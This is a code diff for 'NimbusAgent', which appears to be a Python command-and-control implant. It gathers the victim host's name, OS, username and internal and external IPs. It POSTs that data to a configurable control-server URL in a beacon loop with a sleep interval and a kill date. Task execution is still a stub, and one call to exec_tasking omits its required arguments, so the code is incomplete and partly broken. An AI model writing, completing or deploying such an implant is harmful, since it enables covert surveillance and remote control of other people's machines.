@@ -10,21 +10,22 @@ import random
 import socket
 import sys
 import time
-import urllib.request
 import platform
+
+from urllib import request, parse
+
+
+# get the API key and URL values
+# after you deploy the AWS infrastructure
+# either hard code here or overwrite
+# using the CLI
+API_KEY = "changeme"
+URL = "http://127.0.0.1/changeme"
 
 
 class NimbusAgent:
     def __init__(self, args):
 
-        # members set via CLI
-        self.api_key = ""
-        self.url = ""
-        self.sleep_interval = ""
-        self.kill_date = ""
-
-        # members set at runtime
-        self.session_id = self.get_session_id()
         self.hostname = self.get_hostname()
         self.os_name = self.get_os_name()
         self.os_ver = self.get_os_ver()
@@ -38,6 +39,8 @@ class NimbusAgent:
         self.username = self.get_username()
         self.internal_ip = self.get_internal_ip()
         self.external_ip = self.get_external_ip()
+        self.sleep_interval = ""
+        self.kill_date = ""
 
     def get_session_id(self):
         """
@@ -51,18 +54,6 @@ class NimbusAgent:
         seed = hostname + user + cwd
         session_id = hashlib.md5(seed.encode('utf-8')).hexdigest()
         return session_id
-
-    def get_api_key(self):
-        return self.api_key
-
-    def set_api_key(self, api_key: str):
-        self.api_key = api_key
-
-    def get_url(self):
-        return self.url
-
-    def set_url(self, url: str):
-        self.url = url
 
     def get_hostname(self):
         return platform.node()
@@ -107,11 +98,11 @@ class NimbusAgent:
     def get_external_ip(self):
         external_ip = ""
         try:
-            with urllib.request.urlopen('https://ifconfig.me/') as response:
+            with request.urlopen('https://ifconfig.me/') as response:
                 html = response.read()
                 external_ip = html.decode("utf-8")
         except:
-            pass
+            logging.error("unable to get external ip address")
         return external_ip
 
     def get_sleep_interval(self):
@@ -129,22 +120,42 @@ class NimbusAgent:
         self.kill_date = date_unix_epoc
 
     def check_kill_date(self):
-        logging.warn("sorry, this function is not implemented")
+        logging.warning("sorry, this function is not implemented")
 
 # -=-=-=-=-=-=-=-=-=-=-=-=-=
 #   Task Commands
 # -=-=-=-=-=-=-=-=-=-=-=-=-=
 
     def get_tasking(self):
-        logging.warn("sorry, this function is not implemented")
-        return True
+        tasking = ""
+        logging.debug(f"sending get_tasking request to: {URL}")
+        try:
+            # convert agent class members to JSON and URL encode
+            post_data = parse.urlencode(self.__dict__).encode()
+
+            # send POST request to control server
+            req = request.Request(URL, data=post_data)
+            resp = request.urlopen(req)
+
+            # read response
+            html = resp.read()
+            tasking = html.decode("utf-8")
+            logging.debug(tasking)
+        except Exception as e:
+            logging.error(e)
+            return ""
+
+        return tasking
 
     def post_tasking_output(self):
-        logging.warn("sorry, this function is not implemented")
+        logging.warning("sorry, this function is not implemented")
 
     def exec_tasking(self, task, arguments):
-        logging.warn("sorry, this function is not implemented")
+        logging.warning("sorry, this function is not implemented")
 
+def extract_task_and_arguments(task):
+        logging.warning("sorry, this function is not implemented")
+        return "", [""]
 
 # -=-=-=-=-=-=-=-=-=-=-=-=-=
 #   Agent Commands
@@ -198,8 +209,15 @@ def main(args):
     agent = NimbusAgent(args)
 
     # pass CLI args to agent
-    agent.set_url(args.url)
-    agent.set_api_key(args.api_key)
+    if args.url != "":
+        logging.debug(f"setting url to {args.url}")
+        global URL
+        URL = args.url
+
+    if args.api_key != "":
+        global API_KEY
+        API_KEY = args.api_key
+
     agent.set_sleep_interval(args.sleep_interval)
     agent.set_kill_date(args.kill_date)
 
@@ -226,6 +244,8 @@ def main(args):
             continue
         else:
             logging.debug("received new task")
+            cmd, task_args = extract_task_and_arguments(task)
+            agent.exec_tasking()
 
         # sleep again
         time.sleep(agent.get_sleep_interval())
